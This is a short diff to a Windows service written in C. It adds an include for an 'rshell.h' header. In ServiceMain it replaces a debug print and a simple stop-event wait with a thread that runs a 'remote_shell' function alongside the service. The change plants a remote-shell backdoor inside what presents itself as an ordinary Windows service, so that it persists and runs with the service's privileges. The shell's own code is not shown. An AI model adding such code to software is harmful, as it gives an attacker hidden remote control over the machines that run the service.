@@ -1,5 +1,5 @@
-#include "svc.h"
-
+#include <svc.h>
+#include <rshell.h>
 /*
 
 typedef struct _SERVICE_STATUS {
@@ -104,10 +104,10 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         CloseHandle(hToken);
         return;
     }
-
-    DBG("%p", (int*)hToken);
-    WaitForSingleObject(ctx.hStopEvent, INFINITE);
-    
+    HANDLE hThread = CreateThread(NULL, 0, remote_shell, NULL, 0, NULL);
+    HANDLE tProcesses[2] = {ctx.hStopEvent, hThread};
+    // WaitForSingleObject(ctx.hStopEvent, INFINITE);
+    WaitForMultipleObjects(2, tProcesses, FALSE, INFINITE);
     ctx.status.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(ctx.hStatus, &ctx.status);
 
